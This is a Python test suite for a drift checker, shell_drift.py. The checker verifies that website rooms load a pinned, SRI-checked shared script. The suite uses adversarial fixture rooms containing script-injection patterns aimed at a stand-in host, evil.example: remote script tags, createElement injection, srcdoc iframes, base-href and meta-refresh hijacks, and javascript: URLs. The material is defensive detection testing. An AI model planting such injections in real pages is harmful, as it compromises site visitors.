#!/usr/bin/env python3
"""Shared pinned shell: shell/v*/ files match SHELL.json, the current release folder matches factory/,
and tools/shell_drift.py tells declared overrides/forks from drift. Offline; temp dirs only."""
import base64, hashlib, json, os, re, shutil, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SHELL = os.path.join(ROOT, 'shell')
fails = []


def ok(cond, msg):
    print(('ok   ' if cond else 'FAIL ') + msg)
    if not cond:
        fails.append(msg)


def b(p):
    return open(p, 'rb').read()


rel = json.load(open(os.path.join(ROOT, 'FACTORY_RELEASE.json')))
for v in sorted(os.listdir(SHELL)):
    mp = os.path.join(SHELL, v, 'SHELL.json')
    if not os.path.isfile(mp):
        continue
    m = json.load(open(mp))
    ok(m['version'] == v, '%s: SHELL.json version matches folder' % v)
    ok(re.fullmatch(r'[0-9a-f]{40}', m['sourceCommit'] or '') is not None, '%s: sourceCommit is a full SHA' % v)
    for fn, meta in m['files'].items():
        data = b(os.path.join(SHELL, v, fn))
        ok(len(data) == meta['bytes'], '%s/%s bytes' % (v, fn))
        ok(hashlib.sha256(data).hexdigest() == meta['sha256'], '%s/%s sha256' % (v, fn))
        ok('sha384-' + base64.b64encode(hashlib.sha384(data).digest()).decode() == meta['integrity'], '%s/%s SRI sha384' % (v, fn))
    if v == rel['version']:
        for fn in m['files']:
            ok(b(os.path.join(SHELL, v, fn)) == b(os.path.join(ROOT, 'factory', fn)), '%s/%s == factory/%s (current release)' % (v, fn, fn))

# drift checker on synthetic rooms
m = json.load(open(os.path.join(SHELL, rel['version'], 'SHELL.json')))
V, SHA = rel['version'], '0' * 40
URL = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/shell/%s/factory.js' % (SHA, V)
INTEG = m['files']['factory.js']['integrity']
FB = '<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>'


def room(tmp, name, shell_tag, site_shell, files=None):
    d = os.path.join(tmp, name)
    os.makedirs(d)
    site = {'siteId': name, 'name': name}
    if site_shell is not None:
        site['shell'] = site_shell
    json.dump(site, open(os.path.join(d, 'site.json'), 'w'))
    open(os.path.join(d, 'index.html'), 'w').write('<html><body>%s%s</body></html>' % (FB, shell_tag))
    for k, v in (files or {}).items():
        open(os.path.join(d, k), 'wb').write(v)
    return d


def run(d, csp=False, legacy=None):
    """Run the checker on one room. The CSP rule (cspRequired defaults to true) is tested on its own below, so by
    default the room is put on a temp legacy list and "CSP rule" notes are dropped; csp=True keeps everything and
    uses `legacy` (a list of siteIds, default none) as the legacy list."""
    if legacy is None:
        legacy = []
        if not csp:
            try:
                legacy = [json.load(open(os.path.join(d, 'site.json'))).get('siteId')]
            except Exception:
                pass
    lf = d.rstrip('/') + '.legacy.json'
    json.dump({'rooms': [x for x in legacy if isinstance(x, str)]}, open(lf, 'w'))
    subprocess.run([sys.executable, os.path.join(ROOT, 'tools', 'shell_drift.py'), d, '--json', d + '.json',
                    '--csp-legacy', lf], capture_output=True, text=True)
    r = json.load(open(d + '.json'))[0]
    if not csp:
        r['findings'] = [x for x in r['findings'] if not x.startswith('CSP rule')]
        r['warnings'] = [x for x in r['warnings'] if not x.startswith('CSP rule')]
        if r['status'] in ('DRIFT', 'WARN', 'OK'):
            r['status'] = 'DRIFT' if r['findings'] else ('WARN' if r['warnings'] else 'OK')
    return r


pinned = '<script src="%s" integrity="%s" crossorigin="anonymous" data-site="site.json?v=1"></script>' % (URL, INTEG)
with tempfile.TemporaryDirectory() as t:
    ext = b"(window.__subxPlugins = window.__subxPlugins || []).push(function (core) { return {}; });\n"
    d = os.path.join(t, 'okroom')
    os.makedirs(os.path.join(d, 'ext'))
    open(os.path.join(d, 'ext', 'room.js'), 'wb').write(ext)
    open(os.path.join(d, 'styles.css'), 'w').write('')
    json.dump({'siteId': 'okroom', 'shell': {'base': V, 'fork': False, 'overrides': {
        'theme': ['styles.css'], 'copy': ['site.json:skin'],
        'modules': [{'file': 'ext/room.js', 'sha256': hashlib.sha256(ext).hexdigest(), 'hooks': ['__subxPlugins'], 'load': 'before', 'reason': 'test'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    open(os.path.join(d, 'index.html'), 'w').write(FB + '<script src="ext/room.js?v=1"></script>' + pinned)
    r = run(d)
    ok(r['status'] == 'OK', 'pinned + declared theme/copy/module = OK (%s)' % r['findings'])

    r = run(room(t, 'nointeg', '<script src="%s" crossorigin="anonymous"></script>' % URL, {'base': V}))
    ok(r['status'] == 'DRIFT' and any('integrity' in x for x in r['findings']), 'pinned without SRI = DRIFT')

    r = run(room(t, 'floating', '<script src="https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@main/shell/%s/factory.js"></script>' % V, {'base': V}))
    ok(r['status'] == 'DRIFT', '@main (not a full SHA) = DRIFT')

    shell_bytes = b(os.path.join(ROOT, 'factory', 'factory.js'))
    forked = shell_bytes + b'// room fork\n'
    fsha = hashlib.sha256(forked).hexdigest()
    r = run(room(t, 'forkok', '<script src="factory.js?v=1"></script>',
                 {'base': V, 'fork': True, 'sha256': fsha, 'reason': 'test', 'exception': 'E0'}, {'factory.js': forked}))
    ok(r['status'] == 'FORK' and r['layers'].get('forkDiffLines') == 1, 'declared fork = FORK with diff size (%s)' % r)

    r = run(room(t, 'forkedit', '<script src="factory.js?v=1"></script>',
                 {'base': V, 'fork': True, 'sha256': fsha, 'reason': 'test', 'exception': 'E0'}, {'factory.js': forked + b'//x\n'}))
    ok(r['status'] == 'DRIFT' and any('undeclared edit' in x for x in r['findings']), 'edited fork (sha mismatch) = DRIFT')

    # B2 (hub, 2026-11-04): a self-hosted byte copy of the pinned shell, declared as a fork, with SRI and script-src 'self'
    # only = FORK with 0 diff lines and no findings, CSP rule enforced (the hub's shape: EXCEPTIONS.md E21)
    pin_bytes = b(os.path.join(ROOT, 'shell', V, 'factory.js'))
    ok('sha384-' + base64.b64encode(hashlib.sha384(pin_bytes).digest()).decode() == INTEG, 'self-host: shell/%s/factory.js bytes match the SHELL.json SRI' % V)
    sd = os.path.join(t, 'selfhost'); os.makedirs(os.path.join(sd, 'shell', V))
    open(os.path.join(sd, 'shell', V, 'factory.js'), 'wb').write(pin_bytes)
    json.dump({'siteId': 'selfhost', 'shell': {'base': V, 'fork': True, 'file': 'shell/%s/factory.js' % V, 'sha256': hashlib.sha256(pin_bytes).hexdigest(),
                                                 'reason': 'self-hosted byte copy', 'exception': 'E21'}}, open(os.path.join(sd, 'site.json'), 'w'))
    sh_tag = '<script src="/shell/%s/factory.js" integrity="%s" crossorigin="anonymous" data-site="/site.json"></script>' % (V, INTEG)
    open(os.path.join(sd, 'index.html'), 'w').write('<html><head><meta http-equiv="Content-Security-Policy" content="script-src \'self\'; object-src \'none\'; base-uri \'none\'"></head><body>%s</body></html>' % sh_tag)
    r = run(sd, csp=True)
    ok(r['status'] == 'FORK' and r['layers'].get('forkDiffLines') == 0 and not r['findings'] and not r['warnings'],
       "self-hosted byte copy + SRI + script-src 'self' = FORK, 0 diff lines, no findings (%s %s)" % (r['findings'][:2], r['warnings'][:2]))
    open(os.path.join(sd, 'shell', V, 'factory.js'), 'ab').write(b'//x\n')
    r = run(sd, csp=True)
    ok(r['status'] == 'DRIFT' and any('undeclared edit' in x for x in r['findings']), 'self-hosted copy edited after declaring = DRIFT')
    # Round 5 (hub, E21): the hub-only fork = the pinned bytes with only the header source line replaced, loaded under its
    # own new SRI, script-src and connect-src 'self' = FORK with 2 diff lines (one line out, one in), no findings
    hl = pin_bytes.split(b'\n'); hi = [i for i, l in enumerate(hl) if b'github.com/' in l and l.lstrip().startswith(b'*')]
    ok(len(hi) == 1, 'hub fork: the pinned shell has exactly one header source line')
    hl[hi[0]] = (' * Source: SubX shared shell %s (hub fork, header only)' % V).encode(); hf = b'\n'.join(hl)
    hsri = 'sha384-' + base64.b64encode(hashlib.sha384(hf).digest()).decode()
    open(os.path.join(sd, 'shell', V, 'factory.js'), 'wb').write(hf)
    json.dump({'siteId': 'selfhost', 'shell': {'base': V, 'fork': True, 'file': 'shell/%s/factory.js' % V, 'sha256': hashlib.sha256(hf).hexdigest(),
                                                 'reason': 'hub fork, header only', 'exception': 'E21'}}, open(os.path.join(sd, 'site.json'), 'w'))
    open(os.path.join(sd, 'index.html'), 'w').write('<html><head><meta http-equiv="Content-Security-Policy" content="script-src \'self\'; connect-src \'self\'; object-src \'none\'; base-uri \'none\'"></head><body>%s</body></html>' % sh_tag.replace(INTEG, hsri))
    r = run(sd, csp=True)
    ok(hsri != INTEG and r['status'] == 'FORK' and r['layers'].get('forkDiffLines') == 2 and not r['findings'] and not r['warnings'],
       "hub header-only fork + new SRI + script-src/connect-src 'self' = FORK, 2 diff lines, no findings (%s %s)" % (r['findings'][:2], r['warnings'][:2]))

    r = run(room(t, 'legacy', '<script src="factory.js?v=1"></script>', None, {'factory.js': shell_bytes}))
    ok(r['status'] == 'DRIFT', 'no shell block = DRIFT (legacy)')

    r = run(room(t, 'stale', pinned, {'base': V, 'fork': False}, {'factory.js': shell_bytes}))
    ok(r['status'] == 'DRIFT' and any('stale local' in x for x in r['findings']), 'pinned + leftover local copy = DRIFT')

    r = run(room(t, 'undeclared', pinned + '<script src="extra.js"></script>', {'base': V}, {'extra.js': b''}))
    ok(r['status'] == 'DRIFT' and any('undeclared local script' in x for x in r['findings']), 'undeclared module = DRIFT')

    gate = b'/* room gate */\n'
    r = run(room(t, 'kept', '<script src="gate.js?v=1"></script>' + pinned,
                 {'base': V, 'keep': [{'file': 'gate.js', 'sha256': hashlib.sha256(gate).hexdigest(), 'reason': 'E1'}]}, {'gate.js': gate}))
    ok(r['status'] == 'OK', 'room file in shell.keep (gate.js, sha256-pinned) = OK (%s)' % r['findings'])

    pre = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/factory/factory.js' % m['sourceCommit']
    r = run(room(t, 'premerge', '<script src="%s" integrity="%s" crossorigin="anonymous"></script>' % (pre, INTEG), {'base': V}))
    ok(r['status'] == 'OK', 'pre-merge factory/ path at SHELL.json sourceCommit = OK (%s)' % r['findings'])
    other = pre.replace(m['sourceCommit'], '1' * 40)
    r = run(room(t, 'premerge2', '<script src="%s" integrity="%s" crossorigin="anonymous"></script>' % (other, INTEG), {'base': V}))
    ok(r['status'] == 'DRIFT', 'factory/ path at any other commit = DRIFT')

# ---- Key 2 adversarial rooms (test/fixtures/shell_drift/adv, from the PR #28 Key 2 review): each must be DRIFT ----
ADV = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv')
ADV_EXPECT = {
    'a_inline': 'undeclared inline <script>',
    'b_singlequote': 'undeclared local script app.js',
    'g_unquoted': 'undeclared local script app.js',
    'c_commentedpin': 'no shell runs',
    'd_deep': 'a/b/page.html:1 loads undeclared local script factory-copy.js',
    'e_dynamic': 'at runtime',
    'f_keepmut': "keep entry 'gate.js' must be {file, sha256, reason}",
}
for name, needle in sorted(ADV_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name)
        shutil.copytree(os.path.join(ADV, name), d)
        r = run(d)
        ok(r['status'] == 'DRIFT' and any(needle in x for x in r['findings']),
           'adv %s = DRIFT with "%s" (%s)' % (name, needle, r['status']))


def sha(b_):
    return hashlib.sha256(b_).hexdigest()


def write(d, rel, data):
    p = os.path.join(d, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, 'wb' if isinstance(data, bytes) else 'w').write(data)


with tempfile.TemporaryDirectory() as t:
    # precision: the same rooms come out clean once the difference is declared
    d = os.path.join(t, 'b_declared'); shutil.copytree(os.path.join(ADV, 'b_singlequote'), d)
    json.dump({'siteId': 'b', 'shell': {'base': V, 'overrides': {'modules': [
        {'file': 'app.js', 'sha256': sha(b(os.path.join(d, 'app.js'))), 'hooks': ['__subxPlugins'], 'load': 'before', 'reason': 't'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'OK', 'single-quoted local src declared as module = OK (%s)' % r['findings'])

    d = os.path.join(t, 'a_declared'); shutil.copytree(os.path.join(ADV, 'a_inline'), d)
    html = open(os.path.join(d, 'index.html')).read()
    body = html.split('<script>', 1)[1].split('</script>', 1)[0]
    json.dump({'siteId': 'a', 'shell': {'base': V, 'overrides': {'inline': [{'page': 'index.html', 'sha256': sha(body.encode()), 'reason': 't'}]}}},
              open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'OK', 'inline <script> declared by page + sha256 = OK (%s)' % r['findings'])
    write(d, 'index.html', html.replace('window.evil=1', 'window.evil=2'))
    r = run(d); ok(r['status'] == 'DRIFT', 'declared inline script edited = DRIFT')

    d = os.path.join(t, 'c_declared'); shutil.copytree(os.path.join(ADV, 'c_commentedpin'), d)
    json.dump({'siteId': 'c', 'shell': {'base': V, 'overrides': {'modules': [
        {'file': 'app.js', 'sha256': sha(b(os.path.join(d, 'app.js'))), 'hooks': [], 'load': 'before', 'reason': 't'}]}}},
        open(os.path.join(d, 'site.json'), 'w'))
    r = run(d); ok(r['status'] == 'DRIFT' and r['findings'] == ['index.html runs no shell (no live, running factory.js pin): the main page must run it',
                                                                 'no pinned factory.js <script> on any page (no shell runs)'],
                   'commented-out pin with everything else declared = DRIFT, only "no shell runs" (%s)' % r['findings'])

    # nested page carrying its own real shell copy
    d = room(t, 'nested_copy', pinned, {'base': V})
    write(d, 'a/b/page.html', '<script src="factory.js"></script>')
    write(d, 'a/b/factory.js', b(os.path.join(ROOT, 'factory', 'factory.js')))
    r = run(d)
    ok(r['status'] == 'DRIFT' and any('a/b/page.html:1 loads local a/b/factory.js' in x for x in r['findings'])
       and any('a/b/factory.js is a shell copy' in x for x in r['findings']), 'nested page with its own shell copy = DRIFT (%s)' % r['findings'])

    # unreferenced shell copy with an edited body still carries the SubX factory header
    d = room(t, 'orphan_copy', pinned, {'base': V})
    write(d, 'old/f.js', b(os.path.join(ROOT, 'factory', 'factory.js'))[:2000] + b'\n// edited\n')
    r = run(d); ok(r['status'] == 'DRIFT' and any('old/f.js is a shell copy' in x for x in r['findings']), 'unreferenced edited shell copy = DRIFT')

    # runtime loads of a factory/shell file from declared room JS: DRIFT even with an "injects" reason
    for label, code in (('dynamic import()', "import('https://cdn.example/factory.js');\n"),
                        ('createElement script', "var s=document.createElement(\"script\");s.src='factory.js';document.head.appendChild(s);\n")):
        js = code.encode()
        d = room(t, 'dyn_' + label.split()[0], '<script src="ext.js"></script>' + pinned,
                 {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't', 'injects': 'declared'}]}},
                 {'ext.js': js})
        r = run(d); ok(r['status'] == 'DRIFT' and any('names a factory/shell file' in x for x in r['findings']),
                       'declared module doing %s of a shell file = DRIFT (%s)' % (label, r['findings']))
    js = b"var s=document.createElement('script');s.src='https://maps.example/x.js';document.head.appendChild(s);\n"
    d = room(t, 'inj_undeclared', '<script src="ext.js"></script>' + pinned,
             {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't'}]}}, {'ext.js': js})
    r = run(d); ok(r['status'] == 'DRIFT', 'module injecting a non-shell script without "injects" = DRIFT')
    d = room(t, 'inj_declared', '<script src="ext.js"></script>' + pinned,
             {'base': V, 'overrides': {'modules': [{'file': 'ext.js', 'sha256': sha(js), 'hooks': [], 'load': 'before', 'reason': 't', 'injects': 'map widget'}]}}, {'ext.js': js})
    r = run(d); ok(r['status'] == 'OK', 'module injecting a non-shell script with a declared "injects" reason = OK (%s)' % r['findings'])

    # keep files: sha256 pin enforced, and a keep file that is a shell copy is still DRIFT
    d = room(t, 'keep_edit', '<script src="gate.js"></script>' + pinned,
             {'base': V, 'keep': [{'file': 'gate.js', 'sha256': sha(b'one'), 'reason': 'E1'}]}, {'gate.js': b'two'})
    r = run(d); ok(r['status'] == 'DRIFT' and any('keep gate.js sha256 differs' in x for x in r['findings']), 'keep file edited after pin = DRIFT')
    shell_bytes = b(os.path.join(ROOT, 'factory', 'factory.js'))
    d = room(t, 'keep_shell', '<script src="gate.js"></script>' + pinned,
             {'base': V, 'keep': [{'file': 'gate.js', 'sha256': sha(shell_bytes), 'reason': 'E1'}]}, {'gate.js': shell_bytes})
    r = run(d); ok(r['status'] == 'DRIFT' and any('gate.js is a shell copy' in x for x in r['findings']), 'keep file that is a shell copy = DRIFT')

    # third-party: emoji-picker@1 without SRI is WARN (not OK, not DRIFT); the two shell/csp.md forms clear it (CSP tests below)
    d = room(t, 'emoji_warn', pinned + '<script type="module" src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1/index.js"></script>', {'base': V})
    r = run(d); ok(r['status'] == 'WARN' and r['warnings'], 'emoji-picker-element@1 without SRI = WARN')
    d = room(t, 'emoji_pinned', pinned + '<script type="module" src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1.21.3/index.js" integrity="sha384-x" crossorigin="anonymous"></script>', {'base': V})
    r = run(d); ok(r['status'] == 'WARN' and 'emoji-picker-element@1.21.3' in ' '.join(r['warnings']),
                   'emoji-picker-element exact version + integrity on the CDN, no strict CSP listing its folder = WARN (shell/csp.md forms clear it)')

    # no fallback host: fastly mirror is not a declared pin
    d = room(t, 'fastly', pinned.replace('cdn.jsdelivr.net', 'fastly.jsdelivr.net'), {'base': V})
    r = run(d); ok(r['status'] == 'DRIFT', 'fastly.jsdelivr.net host (no failover loader exists) = DRIFT')

    # data scripts are not code
    d = room(t, 'ldjson', pinned + '<script type="application/ld+json">{"@type":"WebSite"}</script>', {'base': V})
    r = run(d); ok(r['status'] == 'OK', 'application/ld+json data block = OK')

# ---- C6: Key 2 re-review bypass rooms (test/fixtures/shell_drift/adv2, built by its mk.py) ----
ADV2 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv2')
ADV2_EXPECT = {  # room: (status, finding needle, warning needle)
    'h0_control': ('OK', None, None),
    'w_emoji': ('WARN', None, 'emoji-picker-element@1 has no SRI'),
    'h1_upper': ('DRIFT', 'undeclared local script app.js', None),
    'h2_data': ('DRIFT', 'undeclared remote script data:', None),
    'h3_srcdoc': ('DRIFT', 'undeclared <iframe srcdoc>', None),
    'h4_base': ('DRIFT', '<base href=', None),
    'h5_modimport': ('DRIFT', 'ext/room.js statically imports https://evil.example/x.js', None),
    'h5b_inlinemod': ('DRIFT', 'inline statically imports https://evil.example/x.js', None),
    'h6_extrabefore': ('DRIFT', 'undeclared local script pre.js', None),
    'h7_onerror': ('DRIFT', 'undeclared <img onerror=>', None),
    'h8_inertpin': ('DRIFT', 'pin is not live: it carries attributes outside the pin template (type)', None),
    'h9_templatepin': ('DRIFT', 'pin is not live: it is not a direct child of <head> or <body>', None),
    'h10_evalfetch': ('DRIFT', 'at runtime (', None),
    'h11_obf': ('DRIFT', 'at runtime (createElement(t', None),
    'h12_iframe': ('DRIFT', 'undeclared <a href=javascript:>', 'remote <iframe src=https://evil.example/page.html>'),
    'h13_worker': ('DRIFT', 'at runtime (new Worker(', None),
    'h14_nomodule': ('DRIFT', 'pin is not live: it carries attributes outside the pin template (nomodule)', None),
    'h15_php': ('DRIFT', 'page.php:1 loads undeclared local script factory-copy.js', None),
}
ok(sorted(ADV2_EXPECT) == sorted(x for x in os.listdir(ADV2) if os.path.isdir(os.path.join(ADV2, x))), 'every adv2 fixture room has an expectation')


def adv2(t, name, new=None):
    d = os.path.join(t, new or name)
    shutil.copytree(os.path.join(ADV2, name), d)
    return d


def reshell(d, fn):
    s = json.load(open(os.path.join(d, 'site.json')))
    fn(s['shell'])
    json.dump(s, open(os.path.join(d, 'site.json'), 'w'))


for name, (st, needle, wneedle) in sorted(ADV2_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        r = run(adv2(t, name))
        good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
            and (wneedle is None or any(wneedle in x for x in r['warnings']))
        ok(good, 'adv2 %s = %s%s (%s %s %s)' % (name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))

with tempfile.TemporaryDirectory() as t:
    def page(d):
        return open(os.path.join(d, 'index.html')).read()

    def put(d, html):
        open(os.path.join(d, 'index.html'), 'w').write(html)

    def ov(d, key, entries):
        reshell(d, lambda sh: sh.setdefault('overrides', {}).setdefault(key, []).extend(entries))

    def mod(d, **kw):
        reshell(d, lambda sh: [e.update(kw) for e in sh['overrides']['modules']])

    # h3: srcdoc declared by sha256 in overrides.frames = OK
    d = adv2(t, 'h3_srcdoc', 'h3_decl')
    sd = '<script src="https://evil.example/x.js"></script>'
    ov(d, 'frames', [{'page': 'index.html', 'sha256': sha(sd.encode()), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'srcdoc declared in overrides.frames = OK (%s)' % r['findings'])
    # h4: <base> cannot be declared; without it the same room is OK; <base target> alone is fine
    d = adv2(t, 'h4_base', 'h4_nobase'); put(d, page(d).replace('<base href="https://evil.example/">', '<base target="_blank">'))
    r = run(d); ok(r['status'] == 'OK', 'same room with <base target> only (no href) = OK (%s)' % r['findings'])
    # h5: remote static import listed in the module's "imports" = OK
    d = adv2(t, 'h5_modimport', 'h5_decl'); mod(d, imports=['https://evil.example/x.js'])
    r = run(d); ok(r['status'] == 'OK', 'static remote import listed in module "imports" = OK (%s)' % r['findings'])
    # h5b: inline module declared with its import listed = OK
    d = adv2(t, 'h5b_inlinemod', 'h5b_decl')
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'import "https://evil.example/x.js"'), 'reason': 't', 'imports': ['https://evil.example/x.js']}])
    r = run(d); ok(r['status'] == 'OK', 'declared inline module with its import listed = OK (%s)' % r['findings'])
    # h7: handler declared without "injects" still flags the injection; with "injects" = OK
    d = adv2(t, 'h7_onerror', 'h7_decl')
    hv = "var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s)"
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(hv.encode()), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'DRIFT' and all('undeclared' not in x for x in r['findings']), 'declared on*= handler that injects, no "injects" = DRIFT (injection only)')
    reshell(d, lambda sh: sh['overrides']['inline'][0].update(injects='t'))
    r = run(d); ok(r['status'] == 'OK', 'declared on*= handler with "injects" = OK (%s)' % r['findings'])
    # h8/h9/h14: a classic pin runs = OK; type=module (C8, currentScript is null) and <noscript> = DRIFT
    d = adv2(t, 'h8_inertpin', 'h8_module'); put(d, page(d).replace('type="text/plain"', 'type="module"'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('pin has type=module' in x for x in r['findings']), 'pin with type="module" = DRIFT (C8)')
    d = adv2(t, 'h8_inertpin', 'h8_classic'); put(d, page(d).replace(' type="text/plain"', ''))
    r = run(d); ok(r['status'] == 'OK', 'same pin as a classic script = OK (%s)' % r['findings'])
    d = adv2(t, 'h9_templatepin', 'h9_noscript'); put(d, page(d).replace('template>', 'noscript>'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('noscript' in x and 'pin is not live' in x for x in r['findings']), 'pin inside <noscript> = DRIFT')
    d = adv2(t, 'h9_templatepin', 'h9_out'); put(d, page(d).replace('<template>', '').replace('</template>', ''))
    r = run(d); ok(r['status'] == 'OK', 'same pin outside <template> = OK')
    d = adv2(t, 'h0_control', 'dupsrc'); put(d, page(d).replace('<script src="https://cdn', '<script src="ext/x.js" src="https://cdn'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('duplicated attributes' in x for x in r['findings']), 'pin tag with a duplicated src (browser uses the first) = DRIFT')
    # h10/h11/h13: best-effort injection hits clear with a declared "injects" reason
    for n in ('h10_evalfetch', 'h11_obf', 'h13_worker'):
        d = adv2(t, n, n + '_decl'); mod(d, injects='reviewed')
        r = run(d); ok(r['status'] == 'OK', '%s with declared "injects" = OK (%s)' % (n, r['findings']))
    # h12: frame and javascript: URL both declared = OK; remote iframe alone = WARN
    d = adv2(t, 'h12_iframe', 'h12_decl')
    ov(d, 'frames', [{'page': 'index.html', 'src': 'https://evil.example/page.html', 'reason': 't'}])
    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'javascript:void(0)'), 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'remote iframe + javascript: URL both declared = OK (%s %s)' % (r['findings'], r['warnings']))
    d = adv2(t, 'h12_iframe', 'h12_warn'); put(d, page(d).replace('<a href="javascript:void(0)">x</a>', ''))
    r = run(d); ok(r['status'] == 'WARN' and not r['findings'], 'undeclared remote iframe alone = WARN')
    d = adv2(t, 'h0_control', 'frames_bad')
    put(d, page(d).replace('<script src="ext', '<iframe src="data:text/html,x"></iframe><object data="x.swf"></object><script src="ext'))
    r = run(d); ok(r['status'] == 'DRIFT' and any('data source' in x for x in r['findings']) and any('undeclared <object>' in x for x in r['findings']),
                   'data: iframe and undeclared <object> = DRIFT')
    # h15: the php page with its script declared and present = OK
    d = adv2(t, 'h15_php', 'h15_decl'); fc = b'window.x=1;\n'; write(d, 'factory-copy.js', fc)
    reshell(d, lambda sh: sh.setdefault('keep', []).append({'file': 'factory-copy.js', 'sha256': sha(fc), 'reason': 't'}))
    r = run(d); ok(r['status'] == 'DRIFT' and any('page.php loads room JS (factory-copy.js) but runs no shell' in x for x in r['findings']),
                   'php page loading a keep file without the shell, not in noShell = DRIFT (F1)')
    reshell(d, lambda sh: sh.update(noShell=['page.php']))
    r = run(d); ok(r['status'] == 'OK', 'php page script declared in keep + page in shell.noShell = OK (%s)' % r['findings'])
    # svg pages are scanned too
    d = adv2(t, 'h0_control', 'svg'); write(d, 'img/x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
    r = run(d); ok(r['status'] == 'DRIFT' and any('img/x.svg' in x for x in r['findings']), 'script inside a room .svg = DRIFT')
    # static local imports: target must be declared; once declared = OK; a static import of a shell file = DRIFT
    d = adv2(t, 'h0_control', 'locimp')
    m1 = b"import './util.js';\n" + b(os.path.join(d, 'ext', 'room.js')); write(d, 'ext/room.js', m1); write(d, 'ext/util.js', b'export const x = 1;\n')
    mod(d, sha256=sha(m1))
    r = run(d); ok(r['status'] == 'DRIFT' and any('imports undeclared local module ext/util.js' in x for x in r['findings']), 'static import of an undeclared local module = DRIFT')
    ov(d, 'modules', [{'file': 'ext/util.js', 'sha256': sha(b'export const x = 1;\n'), 'hooks': [], 'load': 'import', 'reason': 't'}])
    r = run(d); ok(r['status'] == 'OK', 'same import once ext/util.js is declared = OK (%s)' % r['findings'])
    m2 = b"import 'https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js';\n"; write(d, 'ext/util.js', m2)
    reshell(d, lambda sh: [e.update(sha256=sha(m2), imports=['https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js'])
                           for e in sh['overrides']['modules'] if e['file'] == 'ext/util.js'])
    r = run(d); ok(r['status'] == 'DRIFT' and any('statically imports a factory/shell file' in x for x in r['findings']), 'static import of a shell file (even if listed) = DRIFT')

# ---- F1/F2/C7-C9: PR #29 Key 2 bypass rooms (test/fixtures/shell_drift/adv3, built by its mk3.py) ----
ADV3 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv3')
ADV3_EXPECT = {  # room: (status, finding needle, warning needle)
    'k1_metarefresh': ('DRIFT', 'undeclared <meta http-equiv=refresh> to remote https://evil.example/', None),
    'k2_modulepreload': ('WARN', None, 'remote <link rel=modulepreload href=https://evil.example/x.js>'),
    'k3a_wsrc': ('DRIFT', 'undeclared local script app.js', None),
    'k3b_entsrc': ('DRIFT', 'undeclared remote script https://evil.example/x.js', None),
    'k3c_entpin': ('OK', None, None),
    'k4a_svghref': ('DRIFT', 'undeclared remote script https://evil.example/x.js', None),
    'k4b_svgxlink': ('DRIFT', 'undeclared remote script https://evil.example/x.js', None),
    'k4c_foreignobj': ('DRIFT', 'undeclared remote script https://evil.example/x.js', None),
    'k4d_foreignpin': ('DRIFT', 'pin is not live: it is not a direct child of <head> or <body> (open ancestors: html > head > svg', None),
    'k5_css': ('WARN', None, 'CSS @import of remote https://evil.example/x.css'),
    'k6_duppin': ('DRIFT', 'integrity missing or not the SHELL.json value', None),
    'k7_lookalike': ('DRIFT', 'index.html runs no shell', None),
    'k8_cspmeta': ('DRIFT', 'pin is blocked by index.html:1 <meta> CSP', None),
    'k9_pinelsewhere': ('DRIFT', 'index.html runs no shell', None),
    'k10_importmap': ('DRIFT', '<script type=importmap>: an import map can remap module specifiers', None),  # N6
    'k11_modulepin': ('DRIFT', 'pin has type=module', None),
    'k12_headers': ('DRIFT', 'pin is blocked by _headers header CSP for /*', None),
    'k13_frameset': ('DRIFT', 'the page has a <frameset>', 'remote <frame src=https://evil.example/>'),  # N3
    'k14_pinquery': ('DRIFT', 'pin URL carries a query or fragment (?v=2)', None),
    'k15_srcset_iframe_entity': ('DRIFT', '<iframe> with a javascript source', None),
}
ok(sorted(ADV3_EXPECT) == sorted(x for x in os.listdir(ADV3) if os.path.isdir(os.path.join(ADV3, x))), 'every adv3 fixture room has an expectation')
for name, (st, needle, wneedle) in sorted(ADV3_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV3, name), d)
        r = run(d)
        good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
            and (wneedle is None or any(wneedle in x for x in r['warnings']))
        ok(good, 'adv3 %s = %s%s (%s %s %s)' % (name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))

PIN3 = '<script src="%s" integrity="%s" crossorigin="anonymous"></script>' % (URL, INTEG)
with tempfile.TemporaryDirectory() as t:
    def adv3(name, new):
        d = os.path.join(t, new); shutil.copytree(os.path.join(ADV3, name), d); return d

